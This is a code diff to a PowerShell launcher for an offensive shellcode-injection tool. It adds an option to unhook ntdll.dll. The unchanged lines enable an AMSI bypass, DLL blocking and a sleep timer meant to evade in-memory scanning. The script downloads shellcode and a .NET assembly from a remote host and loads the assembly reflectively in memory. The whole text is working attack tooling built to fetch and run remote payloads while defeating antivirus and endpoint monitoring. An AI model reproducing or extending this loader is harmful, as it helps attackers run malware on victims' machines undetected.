@@ -59,8 +59,11 @@ $M = "True"
 # bypass AMSI ("True" / "False")
 $N = "True"
 
+# unhook ntdll.dll ("True" / "False")
+$O = "False"
+
 # number of seconds (approx.) to sleep before execution to evade in-memory scan (for values greater than "60" it will take much longer to sleep)
-$O = "0"
+$P = "0"
 
 # --------------------------------------------------------------------
 
@@ -83,7 +86,7 @@ if ($methods.Contains($A)) {
     }
 }
 
-$cmd = "${A} /sc:http://${B}:${C}/${E} /password:${F} /image:${G} /pid:${H} /ppid:${I} /dll:${J} /stomp:${K} /export:${L} /blockDlls:${M} /am51:${N} /sleep:${O}"
+$cmd = "${A} /sc:http://${B}:${C}/${E} /password:${F} /image:${G} /pid:${H} /ppid:${I} /dll:${J} /stomp:${K} /export:${L} /blockDlls:${M} /am51:${N} /unhook:${O} /sleep:${P}"
 
 $data = (IWR -UseBasicParsing "http://${B}:${C}/${D}").Content
 $assem = [System.Reflection.Assembly]::Load($data)
